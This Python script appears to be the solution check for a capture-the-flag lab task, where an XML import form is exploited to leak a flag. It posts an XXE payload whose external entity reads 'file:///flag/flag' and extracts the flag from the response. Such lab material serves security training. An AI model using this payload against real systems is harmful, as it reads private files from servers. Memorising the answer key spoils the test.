#!/usr/bin/env python3
"""UI-path regression check for inj4 (Catalogo).

The app's own form posts the record as application/x-www-form-urlencoded
(field 'xml'), exactly like a browser. The server used to parse the raw
body as XML and answered "parse error: Content is not allowed in the
prolog" for every form import (bug 2026-10-30). This check reproduces the
browser path and must print the flag when the app is fixed; against the
old app it fails with the prolog error.

Run: python3 solution/ui_check.py http://127.0.0.1:8043
"""
import re
import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8043"
FLAG_RE = re.compile(r"flag\{[^}]+\}")
XML = ('<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag/flag">]>'
       '<record><id>12</id><title>&xxe;</title></record>')


def main() -> int:
    r = requests.post(BASE + "/import", data={"xml": XML}, timeout=15)
    if "Content is not allowed in the prolog" in r.text:
        sys.stderr.write("FAIL: form path still parses the raw body "
                         "(prolog error) — server not fixed\n")
        return 1
    m = FLAG_RE.search(r.text)
    if not m or "Record imported" not in r.text:
        sys.stderr.write(f"FAIL: no flag reflected via the form path: {r.text[:200]!r}\n")
        return 1
    print(m.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
